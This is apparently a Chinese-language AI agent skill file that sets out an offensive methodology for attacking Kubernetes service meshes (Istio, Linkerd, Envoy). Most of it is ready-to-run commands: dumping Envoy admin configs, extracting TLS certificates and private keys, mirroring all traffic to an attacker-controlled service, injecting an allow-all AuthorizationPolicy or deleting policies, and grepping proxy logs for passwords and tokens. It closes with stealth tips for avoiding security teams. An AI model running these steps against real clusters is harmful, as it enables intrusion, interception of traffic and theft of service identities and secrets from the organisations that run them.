---
name: servicemesh-attack
description: "Service Mesh 攻击方法论（Istio/Linkerd/Envoy）。当目标 Kubernetes 集群部署了 Service Mesh、发现 istio-system/linkerd 命名空间、Envoy Sidecar 注入、或需要利用服务网格进行横向移动时使用。覆盖 Istio 配置窃取、Gateway 攻击、Sidecar 注入滥用、Envoy Admin 接口利用、Service-to-Service 横向移动、Linkerd 攻击、TLS 证书窃取、AuthorizationPolicy 绕过、Telemetry 日志利用"
metadata:
  tags: "service-mesh,istio,linkerd,envoy,sidecar,gateway,virtualservice,destinationrule,authorization-policy,横向移动"
  category: "cloud"
---

# Service Mesh 攻击方法论（Istio/Linkerd/Envoy）

Service Mesh 将网络通信逻辑下沉到 Sidecar 代理（Envoy/Linkerd-proxy），通过控制面（Istiod/Linkerd Control Plane）统一管理流量路由、mTLS、访问策略。攻击者视角：控制面是整个网格的"大脑"，拿到控制面配置等于掌握全部微服务拓扑；Sidecar 的 Admin 接口默认监听在 localhost，Pod 内即可访问；VirtualService/DestinationRule 等 CRD 控制着流量走向，有 RBAC 权限即可劫持或篡改路由。

## 深入参考

完整的攻击命令、Envoy Admin API 端点清单、TLS 证书提取流程、AuthorizationPolicy 绕过模板：

→ 读 [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: 环境识别

确认 Service Mesh 类型、版本和部署范围，判断攻击面大小。

| 检测目标 | 命令 | 确认标志 |
|---|---|---|
| Istio 部署 | `kubectl get ns istio-system` | 命名空间存在 |
| Istio 组件 | `kubectl get pods -n istio-system` | istiod、istio-ingressgateway |
| Linkerd 部署 | `kubectl get ns linkerd` | 命名空间存在 |
| Linkerd 组件 | `kubectl get pods -n linkerd` | linkerd-destination、linkerd-proxy-injector |
| Sidecar 注入标签 | `kubectl get ns --show-labels \| grep injection` | `istio-injection=enabled` |
| Pod 内 Sidecar | `kubectl get pod POD -o jsonpath='{.spec.containers[*].name}'` | 含 `istio-proxy` 或 `linkerd-proxy` |
| Istio 版本 | `kubectl get deploy istiod -n istio-system -o jsonpath='{.spec.template.spec.containers[0].image}'` | 版本号影响可用漏洞 |

**Pod 内快速判断（无 kubectl）：**

```bash
# 检查进程
ps aux 2>/dev/null | grep -E 'envoy|pilot-agent|linkerd'

# 检查 Envoy Admin 是否可达
curl -s http://localhost:15000/server_info 2>/dev/null | head -5

# 检查 Linkerd Admin 是否可达
curl -s http://localhost:4191/metrics 2>/dev/null | head -5

# 检查 Istio 证书目录
ls -la /etc/certs/ /var/run/secrets/istio/ 2>/dev/null
```

## Phase 2: 攻击决策树

```
发现 Service Mesh 环境
├── 在 Pod 内（有 Sidecar）
│   ├── Envoy Admin 可达（localhost:15000）
│   │   ├── → Phase 3: 配置 dump / Cluster 枚举 / Listener 枚举
│   │   └── → Phase 3: 通过 /config_dump 获取全网格拓扑
│   ├── 通过 Sidecar 代理访问其他服务
│   │   └── → Phase 5: Service-to-Service 横向移动
│   └── /etc/certs/ 或 /var/run/secrets/istio/ 存在
│       └── → Phase 6: 导出 TLS 证书 → 中间人 / 身份伪造
│
├── 有 K8s RBAC 权限（kubectl 可用）
│   ├── 可读 VirtualService / DestinationRule
│   │   └── → Phase 4: 流量路由窃取 / 服务拓扑绘制
│   ├── 可写 VirtualService / DestinationRule
│   │   └── → Phase 4: 流量劫持（镜像到攻击者服务 / 修改路由权重）
│   ├── 可读 Gateway
│   │   └── → Phase 4: TLS 证书 Secret 提取
│   ├── 可读/写 AuthorizationPolicy
│   │   └── → Phase 7: 策略绕过 / 删除策略 / 注入 allow-all
│   └── 可读 ServiceEntry
│       └── → Phase 4: 外部服务映射（出口流量分析）
│
├── Istio 控制面（istio-system）
│   ├── Istiod 可达 → xDS API 枚举
│   ├── IngressGateway 暴露 → 入口攻击面
│   └── → Phase 4: istio-system 配置全面枚举
│
└── Linkerd 控制面（linkerd）
    ├── linkerd-destination 可达
    ├── ServiceProfile 枚举
    └── → Phase 8: Linkerd 特定攻击
```

## Phase 3: Envoy Admin 接口利用

Envoy Admin 默认监听 `localhost:15000`（Istio）或 `localhost:15001`，Pod 内无需认证即可访问。这是 Service Mesh 攻击中最快的信息收集路径。

**关键端点：**

| 端点 | 用途 | 攻击价值 |
|---|---|---|
| `/clusters` | 上游集群列表 | 全部可达微服务地址与端口 |
| `/config_dump` | 完整 Envoy 配置 | 路由规则、TLS 配置、全网格拓扑 |
| `/listeners` | 监听器列表 | 入站/出站端口与过滤链 |
| `/server_info` | Envoy 版本 | 版本对应已知漏洞 |
| `/stats` | 统计信息 | 流量模式、活跃连接 |
| `/certs` | TLS 证书信息 | 证书 SAN、有效期、CA 链 |
| `/ready` | 就绪状态 | 确认 Envoy 运行正常 |

```bash
# 核心枚举（Pod 内执行）
curl -s http://localhost:15000/clusters | grep -E "^[a-z]" | head -30
curl -s http://localhost:15000/config_dump > /tmp/envoy_config.json
curl -s http://localhost:15000/listeners
curl -s http://localhost:15000/server_info
curl -s http://localhost:15000/certs
```

**从 config_dump 提取关键信息：**

```bash
# 提取所有上游服务地址
cat /tmp/envoy_config.json | python3 -c "
import sys,json
d=json.load(sys.stdin)
for c in d.get('configs',[]):
  if 'dynamic_active_clusters' in c:
    for cl in c['dynamic_active_clusters']:
      name=cl.get('cluster',{}).get('name','')
      if name: print(name)
" 2>/dev/null

# 简化版：grep 提取服务名
grep -oP '"name":\s*"[^"]*svc\.cluster\.local[^"]*"' /tmp/envoy_config.json | sort -u
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的 Envoy Admin API 利用命令

## Phase 4: Istio 配置枚举与操控

通过 Istio CRD 了解全网格的流量路由和服务拓扑，有写权限时可劫持流量。

### 4.1 配置窃取（只读）

```bash
# VirtualService — 路由规则（哪些 URL 路由到哪些服务）
kubectl get virtualservices --all-namespaces -o yaml

# DestinationRule — 负载均衡策略、mTLS 配置
kubectl get destinationrules --all-namespaces -o yaml

# Gateway — 入口配置、TLS 证书引用
kubectl get gateways --all-namespaces -o yaml

# ServiceEntry — 外部服务白名单
kubectl get serviceentries --all-namespaces -o yaml

# AuthorizationPolicy — 访问控制策略
kubectl get authorizationpolicies --all-namespaces -o yaml

# PeerAuthentication — mTLS 模式（STRICT/PERMISSIVE/DISABLE）
kubectl get peerauthentication --all-namespaces -o yaml
```

### 4.2 Gateway TLS 证书提取

```bash
# 找到 Gateway 引用的 Secret
kubectl get gateway -A -o yaml | grep -A 3 "credentialName"

# 提取证书和私钥
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.crt}' | base64 -d > /tmp/mesh-cert.pem
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/mesh-key.pem
openssl x509 -in /tmp/mesh-cert.pem -text -noout
```

### 4.3 流量劫持（需要写权限）

```bash
# 镜像流量到攻击者控制的服务（不影响正常流量，隐蔽窃取）
cat <<'EOF' | kubectl apply -f -
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: mirror-attack
  namespace: TARGET_NS
spec:
  hosts:
  - target-service
  http:
  - route:
    - destination:
        host: target-service
    mirror:
      host: attacker-service
    mirrorPercentage:
      value: 100.0
EOF
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取流量权重篡改和路由劫持模板

## Phase 5: Service-to-Service 横向移动

在 Pod 内通过 Sidecar 代理（或绕过 Sidecar）访问网格中的其他微服务。

```bash
# 列出所有可达服务（从 Envoy clusters）
curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u

# 通过 Sidecar 代理访问目标服务
curl -s http://target-service.target-ns.svc.cluster.local:8080/api/endpoint

# 内部端口探测
for svc in $(curl -s http://localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u); do
  echo "=== $svc ==="
  curl -s -o /dev/null -w "%{http_code}" "http://$svc/" --connect-timeout 2
done

# 尝试访问控制面组件
curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz
curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/configz
```

## Phase 6: TLS 证书窃取与身份伪造

Service Mesh 使用 mTLS 进行服务间认证。窃取证书可以伪造服务身份或实施中间人攻击。

```bash
# Istio 证书位置（Pod 内）
ls -la /etc/certs/                          # 旧版 Istio
ls -la /var/run/secrets/istio/              # 新版 Istio（SDS）

# 提取证书链和私钥
cat /var/run/secrets/istio/root-cert.pem    # CA 根证书
cat /var/run/secrets/istio/cert-chain.pem   # 服务证书链
cat /var/run/secrets/istio/key.pem          # 服务私钥

# 分析证书（提取 SPIFFE ID / 服务身份）
openssl x509 -in /var/run/secrets/istio/cert-chain.pem -text -noout | grep -A 1 "Subject Alternative Name"
# 典型输出: URI:spiffe://cluster.local/ns/NAMESPACE/sa/SERVICE_ACCOUNT

# 使用窃取的证书访问其他服务（绕过 mTLS 认证）
curl --cert /var/run/secrets/istio/cert-chain.pem \
     --key /var/run/secrets/istio/key.pem \
     --cacert /var/run/secrets/istio/root-cert.pem \
     https://target-service:PORT/
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的证书利用与身份伪造命令

## Phase 7: AuthorizationPolicy 绕过

Istio 的 AuthorizationPolicy 控制服务间的访问权限。攻击目标是削弱或消除这些限制。

```bash
# 枚举所有策略
kubectl get authorizationpolicies --all-namespaces -o yaml

# 查找宽松策略（ALLOW 无条件）
kubectl get authorizationpolicies -A -o yaml | grep -B 5 -A 10 "action: ALLOW"

# 查找 PERMISSIVE 模式的 PeerAuthentication（mTLS 非强制）
kubectl get peerauthentication -A -o yaml | grep -B 5 "mode: PERMISSIVE"
```

**有写权限时——注入 allow-all 策略：**

```yaml
# 允许命名空间内所有流量（空 spec = allow all）
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-all
  namespace: TARGET_NAMESPACE
spec: {}
```

**有删除权限时——直接移除策略：**

```bash
kubectl delete authorizationpolicy POLICY_NAME -n TARGET_NAMESPACE
```

## Phase 8: Linkerd 特定攻击

```bash
# 枚举 Linkerd 配置
kubectl get configmap -n linkerd -o yaml
kubectl get serviceprofiles --all-namespaces -o yaml

# Linkerd Proxy Admin（Pod 内）
curl -s http://localhost:4191/metrics
curl -s http://localhost:4191/ready

# Linkerd Dashboard（如果暴露）
kubectl port-forward -n linkerd deploy/linkerd-web 8084:8084
# 访问 http://localhost:8084 查看全网格拓扑和流量

# Linkerd 证书提取
kubectl get secret -n linkerd | grep -i "tls\|cert\|ca"
kubectl get secret linkerd-identity-issuer -n linkerd -o yaml
```

## Phase 9: Telemetry 与日志利用

Service Mesh 的遥测组件（Prometheus、Jaeger、Kiali）可能暴露敏感的流量数据。

```bash
# 查看 Istio 访问日志（可能包含请求头、路径等敏感信息）
kubectl logs -n istio-system deployment/istio-ingressgateway | head -50
kubectl logs -n TARGET_NS POD_NAME -c istio-proxy | grep -iE "password|secret|token|auth"

# Prometheus（如果可达）
curl -s "http://prometheus.istio-system:9090/api/v1/targets" | head
curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_requests_total"

# Kiali（服务网格可视化）
kubectl port-forward -n istio-system deploy/kiali 20001:20001
# 访问 http://localhost:20001 查看全网格拓扑、流量和配置

# Jaeger（分布式追踪）
kubectl port-forward -n istio-system deploy/jaeger 16686:16686
# 访问 http://localhost:16686 查看请求链路追踪
```

## 工具速查

| 工具 | 用途 | 关键命令 |
|---|---|---|
| `kubectl` | K8s 资源操作 | `kubectl get virtualservices -A` |
| `istioctl` | Istio 专用 CLI | `istioctl analyze`、`istioctl proxy-config` |
| `curl` | Envoy Admin 接口 | `curl http://localhost:15000/clusters` |
| `openssl` | 证书分析 | `openssl x509 -in cert.pem -text -noout` |
| `linkerd` | Linkerd CLI | `linkerd check`、`linkerd viz dashboard` |
| `tcpdump` | 流量抓取（Pod 内） | `tcpdump -i any -w /tmp/mesh.pcap` |

## 注意事项

**操作安全：**
- 修改 VirtualService/DestinationRule 会立即影响线上流量，操作前务必记录原始配置
- 删除 AuthorizationPolicy 会暴露服务，增加被安全团队发现的风险
- Envoy Admin 接口的访问不会产生 Istio 审计日志，但 kubectl 操作会被 K8s Audit Log 记录
- 流量镜像（mirror）是最隐蔽的窃取方式，不影响正常请求响应

**mTLS 相关：**
- 如果 PeerAuthentication 为 STRICT 模式，非网格内的流量会被拒绝
- PERMISSIVE 模式允许明文和 mTLS 混合——可以用明文直接访问服务
- 窃取的证书有效期通常较短（Istio 默认 24 小时），需要持续获取新证书

**Linkerd vs Istio：**
- Linkerd 的 Proxy Admin 默认在 4191 端口，功能比 Envoy Admin 少
- Linkerd 没有 VirtualService/DestinationRule 等 CRD，使用 ServiceProfile 和 TrafficSplit
- Linkerd 的 identity 证书默认有效期也较短
